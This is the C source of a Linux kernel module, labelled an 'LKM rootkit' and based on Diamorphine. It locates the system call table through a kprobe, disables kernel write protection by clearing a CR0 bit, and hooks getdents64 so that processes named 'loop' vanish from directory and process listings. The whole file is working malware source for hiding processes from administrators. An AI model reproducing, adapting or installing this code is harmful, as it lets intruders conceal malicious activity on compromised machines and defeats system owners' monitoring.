#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_ns.h>

#include <linux/fdtable.h>

#include <linux/sched/signal.h>
#include <linux/sched/task.h>

#ifndef __NR_getdents
#define __NR_getdents 141
#endif
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
            .symbol_name = "kallsyms_lookup_name"
};
unsigned long cr0;
static unsigned long *__sys_call_table;

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents64;


static int convert_str_to_int(const char *str) {
    unsigned long num;
    int err;

    // 使用 simple_strtoul 或 kstrtoul
    err = kstrtoul(str, 10, &num); // 10 表示十进制

    if (err) {

        return err;
    }
    return num;
}
int checkpid(char *pid ,char *name){
	struct task_struct *task;
	int pid_num = convert_str_to_int(pid);
	task = pid_task(find_vpid(pid_num),PIDTYPE_PID);
	printk("pid=%s,pid=%d,name=%s",pid,pid_num,task->comm);
	if(task!=NULL){
		if(memcmp(task->comm,name,strlen(task->comm))==0){
			return 1;
		}
		return 0;

	}
	return 0;
}


	

unsigned long * get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	
#ifdef KPROBE_LOOKUP
	printk("Defined KPROBE");
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	printk("syscall_table found,0x%lx\n",syscall_table);
	return syscall_table;
}



static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {

	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;

	int ret = orig_getdents64(pt_regs), err;

	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;
	char str[20] = "loop";
	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;


	while (off < ret) {
		dir = (void *)kdirent + off;
		int res = checkpid(dir->d_name,str);	
		
	
		if (res == 1) {
		
			printk("equals");
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}


static inline void
write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}

static inline void
protect_memory(void)
{

	write_cr0_forced(cr0);

}

static inline void
unprotect_memory(void)
{

	write_cr0_forced(cr0 & ~0x00010000);

}

static int __init
diamorphine_init(void)
{
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

	cr0 = read_cr0();



	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];


	unprotect_memory();

	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;

	protect_memory();
	printk("IN\n");
	return 0;
}

static void __exit
diamorphine_cleanup(void)
{
	unprotect_memory();

	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;

	protect_memory();

	printk("OUT\n");
}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");